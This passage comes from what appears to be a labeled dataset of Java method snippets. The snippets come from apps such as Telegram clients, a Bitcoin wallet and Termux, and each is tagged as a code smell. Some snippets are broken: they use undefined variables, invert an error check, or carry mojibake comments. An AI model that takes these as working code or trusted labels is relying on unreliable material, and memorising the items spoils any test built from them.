          maxButtonSize=Math.max(maxButtonSize,(int)Math.ceil(width) + AndroidUtilities.dp(4));
        }
      }
      wantedBotKeyboardWidth=Math.max(wantedBotKeyboardWidth,(maxButtonSize + AndroidUtilities.dp(12)) * size + AndroidUtilities.dp(5) * (size - 1));
    }
  }
}",1,Code Smell
"private void showAnimationHint(){
  if (page2 == null || messagesCheckBoxView == null || accent.myMessagesGradientAccentColor2 == 0) {
    return;
  }
  SharedPreferences preferences=MessagesController.getGlobalMainSettings();
  if (preferences.getBoolean(""bganimationhint"",false)) {
    return;
  }
  if (animationHint == null) {
    animationHint=new HintView(getParentActivity(),8);
    animationHint.setShowingDuration(5000);
    animationHint.setAlpha(0);
    animationHint.setVisibility(View.INVISIBLE);
    animationHint.setText(LocaleController.getString(""BackgroundAnimateInfo"",R.string.BackgroundAnimateInfo));
    animationHint.setExtraTranslationY(AndroidUtilities.dp(6));
    frameLayout.addView(animationHint,LayoutHelper.createFrame(LayoutHelper.WRAP_CONTENT,LayoutHelper.WRAP_CONTENT,Gravity.LEFT | Gravity.TOP,10,0,10,0));
  }
  AndroidUtilities.runOnUIThread(() -> {
    if (colorType != 3) {
      return;
    }
    preferences.edit().putBoolean(""bganimationhint"",true).commit();
    animationHint.showForView(messagesCheckBoxView[0],true);
  }
,500);
}",1,Code Smell
"@Override @RequestMapping(value=""thirdPartyPaskPush"",method=RequestMethod.POST) public ResponseResult thirdPartyPaskPush(@Validated @RequestBody CfLogisticsTaskForm cfLogisticsTaskForm) throws Exception {
  if (StringUtils.isEmpty(cfLogisticsTaskForm.getSignType()) || StringUtils.isEmpty(cfLogisticsTaskForm.getSign()) || cfLogisticsTaskForm.getKeyId() == null) {
    return new ResponseResult(CommonCode.INVALID_PARAM,null,""keyId/signType/sign 杩欎笁涓瓧娈甸兘瑕佹彁渚�"");
  }
  if (StringUtils.isNotEmpty(cfLogisticsTaskForm.getWaybillNumber())) {
    CfLogisticsTaskQuery cfLogisticsTaskQuery=new CfLogisticsTaskQuery();
    cfLogisticsTaskQuery.setWaybillNumber(cfLogisticsTaskForm.getWaybillNumber());
    List<CfLogisticsTask> cfLogisticsTaskList=cfLogisticsTaskService.getListByQuery(cfLogisticsTaskQuery);
    if (cfLogisticsTaskList != null && cfLogisticsTaskList.size() > 0) {
      return new ResponseResult(CommonCode.DUPLICATE_DATA,null,""鎸囧畾鐨勮繍鍗曞凡瀛樺湪"");
    }
  }
  checkSign(cfLogisticsTaskForm);
  CfLogisticsFactory cfLogisticsFactory=null;
  if (StringUtils.isNotEmpty(cfLogisticsTaskForm.getFactory())) {
    CfLogisticsFactoryQuery cfLogisticsFactoryQuery=new CfLogisticsFactoryQuery();
    cfLogisticsFactoryQuery.setFactoryName(cfLogisticsTaskForm.getLogisticsStorehouseName());
    List<CfLogisticsFactory> cfLogisticsFactoryList=cfLogisticsFactoryService.getListByQuery(cfLogisticsFactoryQuery);
    if (cfLogisticsFactoryList != null && cfLogisticsFactoryList.size() > 0) {
      cfLogisticsFactory=cfLogisticsFactoryList.get(0);
    }
  }
 else {
    cfLogisticsFactory=cfLogisticsFactoryService.findById(cfLogisticsTaskForm.getFactoryId());
  }
  if (cfLogisticsFactory == null) {
    return new ResponseResult(CommonCode.NO_MORE_DATAS,null,""鎸囧畾鐨勫伐鍘備笉瀛樺湪"");
  }
  CfLogisticsTask cfLogisticsTask=new CfLogisticsTask();
  BeanUtils.copyProperties(cfLogisticsTaskForm,cfLogisticsTask);
  cfLogisticsTask.setEditerUid("""");
  cfLogisticsTask.setFactoryId(cfLogisticsFactory.getId());
  CfLogisticsTask lastCfLogisticsTask=cfLogisticsTaskService.add(cfLogisticsTask);
  return new ResponseResult(CommonCode.SUCCESS,lastCfLogisticsTask);
}",1,Code Smell
"private void updateStore(ListSinceBlock listSinceBlock,Set<String> descriptors){
  listSinceBlock.removed().removeIf(lt -> lt.parent_descs() != null && lt.parent_descs().stream().map(OutputDescriptor::normalize).noneMatch(descriptors::contains));
  listSinceBlock.transactions().removeIf(lt -> lt.parent_descs() != null && lt.parent_descs().stream().map(OutputDescriptor::normalize).noneMatch(descriptors::contains));
  updateStore(listSinceBlock);
}
private synchronized void updateStore(ListSinceBlock listSinceBlock){
  Set<String> updatedScriptHashes=new HashSet<>();
  for (  ListTransaction removedTransaction : listSinceBlock.removed()) {
    if (removedTransaction.confirmations() < 0) {
      updatedScriptHashes.addAll(store.purgeTransaction(removedTransaction.txid()));
    }
  }
  List<ListTransaction> sentTransactions=new ArrayList<>();
  Map<String,Boolean> conflictCache=new HashMap<>();
  for (  ListTransaction listTransaction : listSinceBlock.transactions()) {
    if (isConflicted(listTransaction,conflictCache)) {
      updatedScriptHashes.addAll(store.purgeTransaction(listTransaction.txid()));
      continue;
    }
    try {
      if (listTransaction.category() == Category.receive || listTransaction.category() == Category.immature || listTransaction.category() == Category.generate) {
        Address address=Address.fromString(listTransaction.address());
        String updatedScriptHash=store.addAddressTransaction(address,listTransaction);
        if (updatedScriptHash != null) {
          updatedScriptHashes.add(updatedScriptHash);
        }
      }
 else       if (listTransaction.category() == Category.send) {
        sentTransactions.add(listTransaction);
      }
    }
 catch (    InvalidAddressException e) {
    }
  }
  for (  ListTransaction sentTransaction : sentTransactions) {
    Set<HashIndex> spentOutputs=store.getSpentOutputs().computeIfAbsent(sentTransaction.txid(),txid -> {
      String txhex=getTransaction(txid);
      Transaction tx=new Transaction(Utils.hexToBytes(txhex));
      return tx.getInputs().stream().map(txInput -> new HashIndex(txInput.getOutpoint().getHash(),txInput.getOutpoint().getIndex())).collect(Collectors.toSet());
    }
);
    boolean foundFundingAddress=false;
    for (    HashIndex spentOutput : spentOutputs) {
      Address fundingAddress=store.getFundingAddress(spentOutput);
      if (fundingAddress != null) {
        String updatedScriptHash=store.addAddressTransaction(fundingAddress,sentTransaction);
        if (updatedScriptHash != null) {
          updatedScriptHashes.add(updatedScriptHash);
        }
        foundFundingAddress=true;
      }
    }
    if (!foundFundingAddress) {
      log.error(""Could not find a funding address for wallet spend tx "" + sentTransaction.txid());
    }
  }
  syncMempool(!listSinceBlock.lastblock().equals(lastBlock));
  updatedScriptHashes.addAll(store.updateMempoolTransactions());
  lastBlock=listSinceBlock.lastblock();
  for (  String updatedScriptHash : updatedScriptHashes) {
    Cormorant.getEventBus().post(new ScriptHashStatus(updatedScriptHash,store.getStatus(updatedScriptHash)));
  }
}",1,Code Smell
"@Subscribe public void payNymImageLoaded(PayNymImageLoadedEvent event){
  if (wallet.isMasterWallet() && wallet.hasPaymentCode() && event.getPaymentCode().equals(wallet.getPaymentCode())) {
    WalletConfig walletConfig=wallet.getMasterWalletConfig();
    if (!walletConfig.isUserIcon()) {
      byte[] iconData=ImageUtils.resize(event.getImage(),WalletIcon.SAVE_WIDTH,WalletIcon.SAVE_HEIGHT);
      if (walletConfig.getIconData() == null || !Arrays.equals(walletConfig.getIconData(),iconData)) {
        walletConfig.setIconData(iconData,false);
        EventManager.get().post(new WalletConfigChangedEvent(wallet));
      }
    }
  }
}
",1,Code Smell
"/** 
 * 鍐欏畬HTML娉ㄩ噴缁撴潫绗︼紙 {@code -->}锛夊悗鍋滄銆�
 * @param in
 * @param handler
 * @param tagName
 * @param afterTagName
 * @throws IOException
 */
protected void filterAfterHtmlComment(Reader in,FilterHandler handler,String tagName,String afterTagName) throws IOException {
  Writer out=handler.getOut();
  out.write(TAG_START_CHAR);
  out.write(tagName);
  writeIfNonNull(out,afterTagName);
  if (TAG_END_STR.equals(afterTagName) && tagName.length() >= ""!----"".length() && tagName.endsWith(""--""))   ;
 else   filterAfterHtmlComment(in,handler);
}
/** 
 * 鍐欏畬HTML娉ㄩ噴缁撴潫绗︼紙 {@code -->}锛夊悗鍋滄銆�
 * @param in
 * @param handler
 * @throws IOException
 */
protected void filterAfterHtmlComment(Reader in,FilterHandler handler) throws IOException {
  Writer out=handler.getOut();
  int c=-1;
  while ((c=in.read()) > -1) {
    out.write(c);
    if (c == '-') {
      c=in.read();
      writeIfValid(out,c);
      if (c == '-') {
        c=in.read();
        writeIfValid(out,c);
        if (c == TAG_END_CHAR)         break;
      }
    }
  }
}",1,Code Smell
"public WView justFindViewById(String viewId,HashSet<String> ignoreView){
  if (viewId == null) {
    return null;
  }
  if (this.getIdStr() != null && this.getIdStr().equals(viewId) && !ignoreView.contains(this.getMemAddr())) {
    return this;
  }
  for (int i=0; i < getChildCount(); i++) {
    final WView sameView=getChildAt(i).justFindViewById(viewId,ignoreView);
    if (sameView != null) {
      return sameView;
    }
  }
  return null;
}",1,Code Smell
"public static Storage getNewStorageInstance(Main main,JsonObject config,TenantIdentifier tenantIdentifier,boolean doNotLog) throws InvalidConfigException {
  Storage result;
  if (StorageLayer.ucl == null) {
    result=new Start(main);
  }
 else {
    Storage storageLayer=null;
    ServiceLoader<Storage> sl=ServiceLoader.load(Storage.class,ucl);
    for (    Storage plugin : sl) {
      if (storageLayer == null) {
        storageLayer=plugin;
      }
 else {
        throw new QuitProgramException(""Multiple database plugins found. Please make sure that just one plugin is in the "" + ""/plugin"" + "" ""+ ""folder of the installation. Alternatively, please redownload and install ""+ ""SuperTokens""+ ""."");
      }
    }
    if (storageLayer != null && !main.isForceInMemoryDB() && (storageLayer.canBeUsed(config) || CLIOptions.get(main).isForceNoInMemoryDB())) {
      result=storageLayer;
    }
 else {
      result=new Start(main);
    }
  }
  result.constructor(main.getProcessId(),Main.makeConsolePrintSilent,Main.isTesting);
  Set<LOG_LEVEL> logLevels=null;
  if (doNotLog) {
    logLevels=new HashSet<>();
  }
 else {
    logLevels=Config.getBaseConfig(main).getLogLevels(main);
  }
  result.loadConfig(config,logLevels,tenantIdentifier);
  return result;
}
",1,Code Smell
"public void getNextReactionMention(long dialogId,int topicId,int count,Consumer<Integer> callback){
  final MessagesStorage messagesStorage=getMessagesStorage();
  messagesStorage.getStorageQueue().postRunnable(() -> {
    boolean needRequest=true;
    try {
      SQLiteCursor cursor;
      if (topicId != 0) {
        cursor=getMessagesStorage().getDatabase().queryFinalized(String.format(Locale.US,""SELECT message_id FROM reaction_mentions_topics WHERE state = 1 AND dialog_id = %d AND topic_id = %d LIMIT 1"",dialogId,topicId));
      }
 else {
        cursor=getMessagesStorage().getDatabase().queryFinalized(String.format(Locale.US,""SELECT message_id FROM reaction_mentions WHERE state = 1 AND dialog_id = %d LIMIT 1"",dialogId));
      }
      int messageId=0;
      if (cursor.next()) {
        messageId=cursor.intValue(0);
        needRequest=false;
      }
      cursor.dispose();
      if (messageId != 0) {
        getMessagesStorage().markMessageReactionsAsRead(dialogId,topicId,messageId,false);
        int finalMessageId=messageId;
        AndroidUtilities.runOnUIThread(() -> callback.accept(finalMessageId));
      }
    }
 catch (    SQLiteException e) {
      e.printStackTrace();
    }
    if (needRequest) {
      TLRPC.TL_messages_getUnreadReactions req=new TLRPC.TL_messages_getUnreadReactions();
      req.peer=getMessagesController().getInputPeer(dialogId);
      req.limit=1;
      req.add_offset=count - 1;
      getConnectionsManager().sendRequest(req,(response,error) -> AndroidUtilities.runOnUIThread(() -> {
        TLRPC.messages_Messages res=(TLRPC.messages_Messages)response;
        int messageId=0;
        if (error != null && res != null && res.messages != null && !res.messages.isEmpty()) {
          messageId=res.messages.get(0).id;
        }
        int finalMessageId=messageId;
        AndroidUtilities.runOnUIThread(() -> callback.accept(finalMessageId));
      }
));
    }
  }
);
}",1,Code Smell
"private int getSqlType(BeanElement be){
  Class clz=be.getClz();
  if (clz == LocalDateTime.class || clz == Date.class || clz == java.sql.Date.class || clz == java.sql.Timestamp.class) {
    return Types.DATE;
  }
 else   if (clz == String.class) {
    return Types.VARCHAR;
  }
 else   if (EnumUtil.isEnum(clz)) {
    return Types.VARCHAR;
  }
 else   if (clz == int.class || clz == Integer.class) {
    return Types.INTEGER;
  }
 else   if (clz == long.class || clz == Long.class) {
    return Types.BIGINT;
  }
 else   if (clz == double.class || clz == Double.class) {
    return Types.DECIMAL;
  }
 else   if (clz == float.class || clz == Float.class) {
    return Types.DECIMAL;
  }
 else   if (clz == BigDecimal.class) {
    return Types.DECIMAL;
  }
 else   if (clz == boolean.class || clz == Boolean.class) {
    return Types.BOOLEAN;
  }
 else   if (clz == BigInteger.class) {
    return 999999;
  }
 else   if (clz == short.class || clz == Short.class) {
    return Types.INTEGER;
  }
 else   if (clz == byte.class || clz == Byte.class) {
    return Types.TINYINT;
  }
  return Types.LONGVARCHAR;
}",1,Code Smell
"@Override public void onPageSelected(FilterTabsView.Tab tab,boolean forward){
  if (viewPages[0].selectedType == tab.id) {
    return;
  }
  if (tab.isLocked) {
    filterTabsView.shakeLock(tab.id);
    showDialog(new LimitReachedBottomSheet(DialogsActivity.this,context,LimitReachedBottomSheet.TYPE_FOLDERS,currentAccount,null));
    return;
  }
  ArrayList<MessagesController.DialogFilter> dialogFilters=getMessagesController().getDialogFilters();
  if (!tab.isDefault && (tab.id < 0 || tab.id >= dialogFilters.size())) {
    return;
  }
  isFirstTab=tab.id == filterTabsView.getFirstTabId();
  updateDrawerSwipeEnabled();
  viewPages[1].selectedType=tab.id;
  viewPages[1].setVisibility(View.VISIBLE);
  viewPages[1].setTranslationX(viewPages[0].getMeasuredWidth());
  showScrollbars(false);
  switchToCurrentSelectedMode(true);
  animatingForward=forward;
}",1,Code Smell
"private void updateSendButton(){
  int size=(int)(Math.min(AndroidUtilities.displaySize.x,AndroidUtilities.displaySize.y) / 2 / AndroidUtilities.density);
  if (importingStickers != null) {
    previewSendButton.setText(LocaleController.getString(""ImportStickersRemove"",R.string.ImportStickersRemove));
    previewSendButton.setTextColor(getThemedColor(Theme.key_text_RedBold));
    stickerImageView.setLayoutParams(LayoutHelper.createFrame(size,size,Gravity.CENTER,0,0,0,30));
    stickerEmojiTextView.setLayoutParams(LayoutHelper.createFrame(size,size,Gravity.CENTER,0,0,0,30));
    previewSendButton.setVisibility(View.VISIBLE);
    previewSendButtonShadow.setVisibility(View.VISIBLE);
  }
 else   if (delegate != null && (stickerSet == null || !stickerSet.set.masks)) {
    previewSendButton.setText(LocaleController.getString(""SendSticker"",R.string.SendSticker));
    stickerImageView.setLayoutParams(LayoutHelper.createFrame(size,size,Gravity.CENTER,0,0,0,30));
    stickerEmojiTextView.setLayoutParams(LayoutHelper.createFrame(size,size,Gravity.CENTER,0,0,0,30));
    previewSendButton.setVisibility(View.VISIBLE);
    previewSendButtonShadow.setVisibility(View.VISIBLE);
  }
 else {
    previewSendButton.setText(LocaleController.getString(""Close"",R.string.Close));
    stickerImageView.setLayoutParams(LayoutHelper.createFrame(size,size,Gravity.CENTER));
    stickerEmojiTextView.setLayoutParams(LayoutHelper.createFrame(size,size,Gravity.CENTER));
    previewSendButton.setVisibility(View.GONE);
    previewSendButtonShadow.setVisibility(View.GONE);
  }
}",1,Code Smell
"/** 
 * inner recursively dispatch field with reflect access
 * @param clazz      class of two instance
 * @param left       the left object to handle
 * @param right      the right object to handle
 * @param paths      current node paths
 * @param comparator integrated comparator
 */
private void innerCompare(Class<?> clazz,Object left,Object right,List<Path> paths,IntegratedComparator comparator){
  Field[] fields=clazz.getDeclaredFields();
  for (  Field field : fields) {
    if (field.isSynthetic() || isTransient(field.getModifiers()) || isStatic(field.getModifiers())) {
      continue;
    }
    boolean accessible=field.isAccessible();
    try {
      field.setAccessible(true);
      comparator.dispatch(field.get(left),field.get(right),comparator.declarePath(paths,field.getName()));
    }
 catch (    Exception e) {
      throw new RuntimeException(""illegal access with filed"",e);
    }
 finally {
      field.setAccessible(accessible);
    }
  }
  Class<?> superClazz=clazz.getSuperclass();
  while (superClazz != null && superClazz != Object.class) {
    innerCompare(superClazz,left,right,paths,comparator);
    superClazz=superClazz.getSuperclass();
  }
}
",1,Code Smell
"@Override public void onSharedPreferenceChanged(SharedPreferences p,String key){
  if (key.equals(getString(R.string.key_guard_mode))) {
    AccessibilityConfig.setIsUnintendedGuardEnabled(p.getBoolean(getString(R.string.key_guard_mode),false));
  }
 else   if ((key.equals(getString(R.string.key_use_volume_control_record)) || key.equals(getString(R.string.key_use_volume_control_running))) && p.getBoolean(key,false)) {
    GlobalKeyObserver.init();
  }
}
",1,Code Smell
"@Override protected void onMeasure(int widthMeasureSpec,int heightMeasureSpec){
  ignoreLayout=true;
  int width=MeasureSpec.getSize(widthMeasureSpec);
  int height=MeasureSpec.getSize(heightMeasureSpec);
  setMeasuredDimension(width,height);
  float bitmapW;
  float bitmapH;
  int fullHeight=AndroidUtilities.displaySize.y - ActionBar.getCurrentActionBarHeight() - getAdditionalTop()- getAdditionalBottom();
  int maxHeight=fullHeight - dp(48);
  if (bitmapToEdit != null) {
    bitmapW=bitmapToEdit.getWidth();
    bitmapH=bitmapToEdit.getHeight();
  }
 else {
    bitmapW=width;
    bitmapH=height - ActionBar.getCurrentActionBarHeight() - dp(48);
  }
  float renderWidth=width;
  float renderHeight=(float)Math.floor(renderWidth * bitmapH / bitmapW);
  if (renderHeight > maxHeight) {
    renderHeight=maxHeight;
    renderWidth=(float)Math.floor(renderHeight * bitmapW / bitmapH);
  }
  renderView.measure(MeasureSpec.makeMeasureSpec((int)renderWidth,MeasureSpec.EXACTLY),MeasureSpec.makeMeasureSpec((int)renderHeight,MeasureSpec.EXACTLY));
  renderInputView.measure(MeasureSpec.makeMeasureSpec((int)renderWidth,MeasureSpec.EXACTLY),MeasureSpec.makeMeasureSpec((int)renderHeight,MeasureSpec.EXACTLY));
  baseScale=renderWidth / paintingSize.width;
  entitiesView.setScaleX(baseScale);
  entitiesView.setScaleY(baseScale);
  entitiesView.measure(MeasureSpec.makeMeasureSpec((int)paintingSize.width,MeasureSpec.EXACTLY),MeasureSpec.makeMeasureSpec((int)paintingSize.height,MeasureSpec.EXACTLY));
  if (thanosEffect != null) {
    thanosEffect.measure(MeasureSpec.makeMeasureSpec((int)paintingSize.width,MeasureSpec.EXACTLY),MeasureSpec.makeMeasureSpec((int)paintingSize.height,MeasureSpec.EXACTLY));
    thanosEffect.setScaleX(baseScale);
    thanosEffect.setScaleY(baseScale);
  }
  updateEntitiesSelections();
  selectionContainerView.measure(MeasureSpec.makeMeasureSpec((int)renderWidth,MeasureSpec.EXACTLY),MeasureSpec.makeMeasureSpec((int)renderHeight,MeasureSpec.EXACTLY));
  measureChild(bottomLayout,widthMeasureSpec,heightMeasureSpec);
  measureChild(weightChooserView,widthMeasureSpec,heightMeasureSpec);
  measureChild(pipetteContainerLayout,widthMeasureSpec,heightMeasureSpec);
  int keyboardPad=Math.max(getPKeyboardHeight(),emojiPadding);
  measureChild(overlayLayout,widthMeasureSpec,MeasureSpec.makeMeasureSpec(height - keyboardPad,MeasureSpec.EXACTLY));
  topLayout.setPadding(topLayout.getPaddingLeft(),dp(12) + AndroidUtilities.statusBarHeight,topLayout.getPaddingRight(),topLayout.getPaddingBottom());
  measureChild(topLayout,widthMeasureSpec,heightMeasureSpec);
  ignoreLayout=false;
  int keyboardSize=0;
  if (!waitingForKeyboardOpen && keyboardSize <= dp(20) && !emojiViewVisible && !isAnimatePopupClosing) {
    ignoreLayout=true;
    hideEmojiView();
    ignoreLayout=false;
  }
  if (keyboardSize <= dp(20)) {
  }
 else {
    hideEmojiView();
  }
  if (emojiView != null) {
    measureChild(emojiView,widthMeasureSpec,heightMeasureSpec);
  }
}",1,Code Smell
"@EventHandler private void onKey(KeyEvent event){
  if (Modules.get().isActive(Freecam.class) || mc.currentScreen != null || mc.player.isOnGround())   return;
  if (event.action != KeyAction.Press)   return;
  if (mc.options.jumpKey.matchesKey(event.key,0)) {
    level=mc.player.getBlockPos().getY();
    mc.player.jump();
  }
 else   if (mc.options.sneakKey.matchesKey(event.key,0)) {
    level--;
  }
}",1,Code Smell
"private static void redirect(ClassNode classNode,ClassLoaderRemapper remapper){
  for (  MethodNode methodNode : classNode.methods) {
    for (    AbstractInsnNode insnNode : methodNode.instructions) {
      if (insnNode instanceof MethodInsnNode) {
        if (from.getOpcode() == Opcodes.INVOKESPECIAL && Objects.equals(from.owner,classNode.superName) && Objects.equals(from.name,methodNode.name) && Objects.equals(from.desc,methodNode.desc)) {
          continue;
        }
        process(from,methodNode.instructions,remapper,classNode);
      }
 else       if (insnNode.getOpcode() == Opcodes.INVOKEDYNAMIC) {
        InvokeDynamicInsnNode invokeDynamic=(InvokeDynamicInsnNode)insnNode;
        Object[] bsmArgs=invokeDynamic.bsmArgs;
        for (int i=0; i < bsmArgs.length; i++) {
          Object bsmArg=bsmArgs[i];
          if (bsmArg instanceof Handle) {
            if (toOpcode(handle.getTag()) != -1) {
              bsmArgs[i]=processHandle(handle,remapper);
            }
          }
        }
      }
    }
  }
}
private static void redirect(Class<?> owner,String name,String handlerName,Class<?>... args){
  addRule(false,owner,name,handlerName,args);
}",1,Code Smell
"private void findViewAndShowAnimation(int messageId,int animation){
  if (!attached) {
    return;
  }
  ChatMessageCell bestView=null;
  for (int i=0; i < listView.getChildCount(); i++) {
    View child=listView.getChildAt(i);
    if (child instanceof ChatMessageCell) {
      ChatMessageCell cell=(ChatMessageCell)child;
      String stickerEmoji=cell.getMessageObject().getStickerEmoji();
      if (stickerEmoji == null) {
        stickerEmoji=cell.getMessageObject().messageOwner.message;
      }
      if (cell.getPhotoImage().hasNotThumb() && stickerEmoji != null) {
        if (cell.getMessageObject().getId() == messageId) {
          bestView=cell;
          break;
        }
      }
    }
  }
  if (bestView != null) {
    chatActivity.restartSticker(bestView);
    if (!EmojiData.hasEmojiSupportVibration(bestView.getMessageObject().getStickerEmoji()) && !bestView.getMessageObject().isPremiumSticker() && !bestView.getMessageObject().isAnimatedAnimatedEmoji()) {
      if (!NekoConfig.disableVibration.Bool())       bestView.performHapticFeedback(HapticFeedbackConstants.KEYBOARD_TAP);
    }
    showAnimationForCell(bestView,animation,false,true);
  }
}",1,Code Smell
"public static Collection<Element> getChildElementListNS(Element parent,String nsURI){
  List<Element> list=new ArrayList<>();
  if (parent != null) {
    for (Node node=parent.getFirstChild(); node != null; node=node.getNextSibling()) {
      if (node.getNodeType() == Node.ELEMENT_NODE && node.getNamespaceURI().equals(nsURI)) {
        list.add((Element)node);
      }
    }
  }
  return list;
}
public static Collection<Element> getChildElementListNS(Element parent,String nodeName,String nsURI){
  List<Element> list=new ArrayList<>();
  for (Node node=parent.getFirstChild(); node != null; node=node.getNextSibling()) {
    if (node.getNodeType() == Node.ELEMENT_NODE && node.getLocalName().equals(nodeName) && node.getNamespaceURI().equals(nsURI)) {
      list.add((Element)node);
    }
  }
  return list;
}
",1,Code Smell
"/** 
 * 鍏ㄥ眬灞炴�ч厤缃�
 */
public GlobalVo globalAttr(){
  GlobalVo vo=new GlobalVo();
  vo.setEnv(env);
  vo.setSiteInfo(globalViewConfig);
  vo.setOnlineCnt(userStatisticService.getOnlineUserCnt());
  vo.setSiteStatisticInfo(sitemapService.querySiteVisitInfo(null,null));
  vo.setTodaySiteStatisticInfo(sitemapService.querySiteVisitInfo(LocalDate.now(),null));
  if (ReqInfoContext.getReqInfo() == null || ReqInfoContext.getReqInfo().getSeo() == null || CollectionUtils.isEmpty(ReqInfoContext.getReqInfo().getSeo().getOgp())) {
    Seo seo=seoInjectService.defaultSeo();
    vo.setOgp(seo.getOgp());
    vo.setJsonLd(JSONUtil.toJsonStr(seo.getJsonLd()));
  }
 else {
    Seo seo=ReqInfoContext.getReqInfo().getSeo();
    vo.setOgp(seo.getOgp());
    vo.setJsonLd(JSONUtil.toJsonStr(seo.getJsonLd()));
  }
  try {
    if (ReqInfoContext.getReqInfo() != null && NumUtil.upZero(ReqInfoContext.getReqInfo().getUserId())) {
      vo.setIsLogin(true);
      vo.setUser(ReqInfoContext.getReqInfo().getUser());
      vo.setMsgNum(ReqInfoContext.getReqInfo().getMsgNum());
    }
 else {
      vo.setIsLogin(false);
    }
    HttpServletRequest request=((ServletRequestAttributes)RequestContextHolder.currentRequestAttributes()).getRequest();
    if (request.getRequestURI().startsWith(""/column"")) {
      vo.setCurrentDomain(""column"");
    }
 else     if (request.getRequestURI().startsWith(""/chat"")) {
      vo.setCurrentDomain(""chat"");
    }
 else {
      vo.setCurrentDomain(""article"");
    }
  }
 catch (  Exception e) {
    log.error(""loginCheckError:"",e);
  }
  return vo;
}
",1,Code Smell
"private void callEnded(){
  if (BuildVars.LOGS_ENABLED) {
    FileLog.d(""Call "" + getCallID() + "" ended"");
  }
  isCallEnded=true;
  if (groupCall != null && (!playedConnectedSound || onDestroyRunnable != null)) {
    needPlayEndSound=false;
  }
  AndroidUtilities.runOnUIThread(() -> dispatchStateChanged(STATE_ENDED));
  int delay=700;
  Utilities.globalQueue.postRunnable(() -> {
    if (spPlayId != 0) {
      soundPool.stop(spPlayId);
      spPlayId=0;
    }
  }
);
  if (connectingSoundRunnable != null) {
    AndroidUtilities.cancelRunOnUIThread(connectingSoundRunnable);
    connectingSoundRunnable=null;
  }
  if (needPlayEndSound) {
    playingSound=true;
    if (groupCall == null) {
      Utilities.globalQueue.postRunnable(() -> soundPool.play(spEndId,1,1,0,0,1));
    }
 else {
      Utilities.globalQueue.postRunnable(() -> soundPool.play(spVoiceChatEndId,1.0f,1.0f,0,0,1),100);
      delay=500;
    }
    AndroidUtilities.runOnUIThread(afterSoundRunnable,delay);
  }
  if (timeoutRunnable != null) {
    AndroidUtilities.cancelRunOnUIThread(timeoutRunnable);
    timeoutRunnable=null;
  }
  endConnectionServiceCall(needPlayEndSound ? delay : 0);
  stopSelf();
}",1,Code Smell
"private void buildApiTestCaseDTO(List<ApiTestCaseDTO> apiCaseLists){
  if (CollectionUtils.isNotEmpty(apiCaseLists)) {
    List<String> userIds=new ArrayList<>();
    userIds.addAll(apiCaseLists.stream().map(ApiTestCaseDTO::getCreateUser).toList());
    userIds.addAll(apiCaseLists.stream().map(ApiTestCaseDTO::getUpdateUser).toList());
    userIds.addAll(apiCaseLists.stream().map(ApiTestCaseDTO::getDeleteUser).toList());
    Map<String,String> userMap=userLoginService.getUserNameMap(userIds.stream().filter(StringUtils::isNotBlank).distinct().toList());
    List<String> envIds=apiCaseLists.stream().map(ApiTestCaseDTO::getEnvironmentId).toList();
    EnvironmentExample environmentExample=new EnvironmentExample();
    environmentExample.createCriteria().andIdIn(envIds);
    List<Environment> environments=environmentMapper.selectByExample(environmentExample);
    Map<String,String> envMap=environments.stream().collect(Collectors.toMap(Environment::getId,Environment::getName));
    List<String> ids=apiCaseLists.stream().map(ApiTestCaseDTO::getId).collect(Collectors.toList());
    List<CasePassDTO> passRateList=extApiTestCaseMapper.findPassRateByIds(ids);
    Map<String,String> passRates=passRateList.stream().collect(Collectors.toMap(CasePassDTO::getId,CasePassDTO::getValue));
    List<String> moduleIds=apiCaseLists.stream().map(ApiTestCaseDTO::getModuleId).distinct().toList();
    ApiDefinitionModuleExample moduleExample=new ApiDefinitionModuleExample();
    moduleExample.createCriteria().andIdIn(moduleIds);
    List<ApiDefinitionModule> modules=apiDefinitionModuleMapper.selectByExample(moduleExample);
    Map<String,String> moduleMap=modules.stream().collect(Collectors.toMap(ApiDefinitionModule::getId,ApiDefinitionModule::getName));
    apiCaseLists.forEach(apiCase -> {
      apiCase.setPassRate(passRates.get(apiCase.getId()));
      apiCase.setCreateName(userMap.get(apiCase.getCreateUser()));
      apiCase.setUpdateName(userMap.get(apiCase.getUpdateUser()));
      apiCase.setDeleteName(userMap.get(apiCase.getDeleteUser()));
      apiCase.setModulePath(StringUtils.isNotBlank(moduleMap.get(apiCase.getModuleId())) ? moduleMap.get(apiCase.getModuleId()) : Translator.get(""api_unplanned_request""));
      if (StringUtils.isNotBlank(apiCase.getEnvironmentId()) && MapUtils.isNotEmpty(envMap) && envMap.containsKey(apiCase.getEnvironmentId())) {
        apiCase.setEnvironmentName(envMap.get(apiCase.getEnvironmentId()));
      }
    }
);
  }
}
",1,Code Smell
"/** 
 * Call termux-am-library to run the am command.
 * @param context The {@link Context} to run am command with.
 * @param amCommandArray The am command array.
 * @param stdout The {@link StringBuilder} to set stdout in that is returned by the am command.
 * @param stderr The {@link StringBuilder} to set stderr in that is returned by the am command.
 * @param checkDisplayOverAppsPermission Check if {@link Manifest.permission#SYSTEM_ALERT_WINDOW}has been granted if running on Android `>= 10` and starting activity or service.
 * @return Returns the {@code error} if am command failed, otherwise {@code null}.
 */
public static Error runAmCommand(@NonNull Context context,String[] amCommandArray,@NonNull StringBuilder stdout,@NonNull StringBuilder stderr,boolean checkDisplayOverAppsPermission){
  try (ByteArrayOutputStream stdoutByteStream=new ByteArrayOutputStream();PrintStream stdoutPrintStream=new PrintStream(stdoutByteStream);ByteArrayOutputStream stderrByteStream=new ByteArrayOutputStream();PrintStream stderrPrintStream=new PrintStream(stderrByteStream)){
    if (checkDisplayOverAppsPermission && amCommandArray.length >= 1 && (amCommandArray[0].equals(""start"") || amCommandArray[0].equals(""startservice"")) && !PermissionUtils.validateDisplayOverOtherAppsPermissionForPostAndroid10(context,true)) {
      throw new IllegalStateException(context.getString(R.string.error_display_over_other_apps_permission_not_granted,PackageUtils.getAppNameForPackage(context)));
    }
    new Am(stdoutPrintStream,stderrPrintStream,(Application)context.getApplicationContext()).run(amCommandArray);
    stdoutPrintStream.flush();
    stdout.append(stdoutByteStream.toString(StandardCharsets.UTF_8.name()));
    stderrPrintStream.flush();
    stderr.append(stderrByteStream.toString(StandardCharsets.UTF_8.name()));
  }
 catch (  Exception e) {
    return AmSocketServerErrno.ERRNO_RUN_AM_COMMAND_FAILED_WITH_EXCEPTION.getError(e,Arrays.toString(amCommandArray),e.getMessage());
  }
  return null;
}",1,Code Smell
"@Override public void check() throws SQLException {
  super.check();
